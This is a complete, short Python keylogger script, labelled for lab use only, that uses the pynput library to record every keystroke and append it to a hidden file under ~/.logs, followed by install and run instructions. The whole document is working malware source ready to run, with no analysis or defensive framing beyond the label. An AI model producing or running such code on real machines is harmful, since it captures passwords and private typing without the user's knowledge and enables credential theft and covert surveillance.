#!/usr/bin/env python3
# keylogger.py (lab use only)
from pynput import keyboard
import os

LOGDIR = os.path.expanduser('~/.logs')
LOGFILE = os.path.join(LOGDIR, 'keylog.txt')
os.makedirs(LOGDIR, exist_ok=True)

def on_press(key):
    try:
        k = key.char
    except AttributeError:
        k = f'[{key}]'
    with open(LOGFILE, 'a') as f:
        f.write(k)

with keyboard.Listener(on_press=on_press) as listener:
    listener.join()


# Run: pip install pynput then python3 keylogger.py (lab VMs only). Logs at ~/.logs/keylog.txt.
